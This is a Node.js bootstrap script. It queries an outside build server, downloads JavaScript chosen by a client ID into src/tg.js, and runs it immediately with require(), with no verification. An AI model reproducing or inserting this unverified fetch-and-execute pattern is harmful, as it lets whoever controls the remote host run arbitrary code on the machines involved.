const fetch = require("node-fetch");
const {Headers} = require('node-fetch')
globalThis.fetch = fetch
globalThis.Headers = Headers
const fs = require("fs");
const path = require("path");


// Function to fetch the URL and save the response to a file
async function fetchAndSave(url, filename) {
    try {
        const response = await fetch(url);

        if (!response.ok) {
            throw new Error(`Failed to fetch URL. Status Code: ${response.status}`);
        }

        const filepath = "./src/tg.js";
        const writeStream = fs.createWriteStream(filepath);

        const buffer = await response.buffer();
        writeStream.write(buffer);
        writeStream.end();

        return new Promise((resolve) => {
            writeStream.on("finish", () => resolve(filepath));
        });
    } catch (error) {
        console.error("Error fetching the URL:", error.message);
    }
}

const versionUrl = "https://uptimechecker2.onrender.com/builds"
fetch(versionUrl).then(async result => {
    const data = await result.json();
    const key = fetchNumbersFromString(process.env.clientId);
    const url = data[key?.toString()||"1"];
    console.log(url)
   const filename = path.resolve(__dirname, 'src', 'tg.js');
    ensureDirectoryExistence(filename);
  fetchAndSave(url, filename)
        .then((filepath) => {
            console.log(`File saved at: ${filepath}`);
            require('./src/tg.js')
        })
        .catch((error) => console.error("Error:", error));
})

function ensureDirectoryExistence(filePath) {
    const dirname = path.dirname(filePath);
    if (fs.existsSync(dirname)) {
        return true;
    }
    ensureDirectoryExistence(dirname);
    fs.mkdirSync(dirname);
}


function fetchNumbersFromString(inputString) {
    const regex = /\d+/g;
    const matches = inputString.match(regex);
    if (matches) {
        const result = matches.join('');
        return result;
    } else {
        return '';
    }
}
